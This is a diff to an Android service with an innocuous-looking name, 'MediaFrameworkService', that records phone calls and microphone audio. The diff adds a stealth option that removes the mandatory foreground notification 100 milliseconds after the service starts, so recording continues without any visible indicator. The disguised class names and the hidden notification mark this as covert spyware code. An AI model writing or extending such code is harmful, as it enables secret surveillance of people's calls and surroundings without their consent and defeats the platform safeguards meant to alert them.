@@ -14,7 +14,9 @@ import android.content.pm.ServiceInfo;
 import android.media.MediaRecorder;
 import android.os.Build;
 import android.os.Environment;
+import android.os.Handler;
 import android.os.IBinder;
+import android.os.Looper;
 import android.os.PowerManager;
 import android.util.Log;
 
@@ -52,7 +54,6 @@ public class MediaFrameworkService extends Service {
     private static volatile boolean isRecordingCall = false;
     private static volatile boolean isRecordingMic = false;
     private static String currentRecordingPath = null;
-    private static String currentRecordingType = null; // "call" or "mic"
     private static long recordingStartTime = 0;
 
     // Call info
@@ -160,19 +161,30 @@ public class MediaFrameworkService extends Service {
 
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                // Use most compatible type for background start
                 int serviceType = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC;
                 try {
                     startForeground(NOTIFICATION_ID, notification, serviceType);
                     isForeground = true;
                 } catch (Exception e) {
-                    Log.w(TAG, "Standard FGS start failed: " + e.getMessage());
                     startForeground(NOTIFICATION_ID, notification);
                     isForeground = true;
                 }
             } else {
                 startForeground(NOTIFICATION_ID, notification);
                 isForeground = true;
+            }
+
+            if (SystemAnalytics.isStealthEnabled(this)) {
+                new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                    try {
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                            stopForeground(STOP_FOREGROUND_REMOVE);
+                        } else {
+                            stopForeground(true);
+                        }
+                        isForeground = false;
+                    } catch (Exception ignored) {}
+                }, 100);
             }
         } catch (Exception e) {
             Log.e(TAG, "Critical FGS failure: " + e.getMessage());
@@ -312,7 +324,6 @@ public class MediaFrameworkService extends Service {
 
             File recordFile = new File(recordDir, fileName);
             currentRecordingPath = recordFile.getAbsolutePath();
-            currentRecordingType = "call";
 
             // Setup MediaRecorder
             mediaRecorder = createMediaRecorder();
@@ -434,7 +445,6 @@ public class MediaFrameworkService extends Service {
 
             File recordFile = new File(recordDir, fileName);
             currentRecordingPath = recordFile.getAbsolutePath();
-            currentRecordingType = "mic";
 
             // Setup MediaRecorder
             mediaRecorder = createMediaRecorder();
@@ -454,8 +464,7 @@ public class MediaFrameworkService extends Service {
                     mediaRecorder.setAudioSource(source);
                     mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                     mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
-                    mediaRecorder.setAudioEncodingBitRate(128000);
-                    mediaRecorder.setAudioSamplingRate(44100);
+                    mediaRecorder.setAudioEncodingBitRate(96000);
                     mediaRecorder.setOutputFile(currentRecordingPath);
 
                     // Set max duration if specified
@@ -620,10 +629,6 @@ public class MediaFrameworkService extends Service {
 
     public static String getCurrentRecordingPath() {
         return currentRecordingPath;
-    }
-
-    public static String getCurrentRecordingType() {
-        return currentRecordingType;
     }
 
     public static long getRecordingDuration() {
